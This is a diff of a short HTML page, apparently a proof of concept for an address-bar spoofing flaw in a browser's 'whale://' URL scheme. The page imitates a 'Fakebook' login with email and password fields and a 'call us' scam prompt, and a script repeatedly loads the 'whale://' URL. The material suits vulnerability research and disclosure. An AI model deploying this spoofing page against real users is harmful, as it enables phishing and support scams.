@@ -1,16 +1,25 @@
+<!DOCTYPE html>
 <html>
-<title>Address Bar spoofing </title>
-<h1> This is Fakebook </h1>
-<title>testing </title>
-<h1> This is Fakebook please acept the popup nd call us  </h1>
-<form>
-Email: <input type="text" name="username" placeholder="add email"><br>
-Password: <input type="text" name="password" placeholder="pass">
-<script>
-function f()
-{
-location ="whale://test.shhnjk.com/alert.html"
-}
-setInterval("f()", 5);
-  </script>
+<head>
+    <title>Address Bar Spoofing</title>
+</head>
+<body>
+    <h1>This is Fakebook</h1>
+    <h2>This is Fakebook, please accept the popup and call us</h2>
+    
+    <form>
+        Email: <input type="text" name="username" placeholder="add email"><br>
+        Password: <input type="text" name="password" placeholder="pass">
+    </form>
+
+    <!-- Adding the iframe -->
+    <iframe id="myFrame" width="600" height="400"></iframe>
+
+    <script>
+        function updateIframe() {
+            document.getElementById('myFrame').src = "whale://test.shhnjk.com/alert.html";
+        }
+        setInterval(updateIframe, 5000); // Update iframe every 5 seconds
+    </script>
+</body>
 </html>
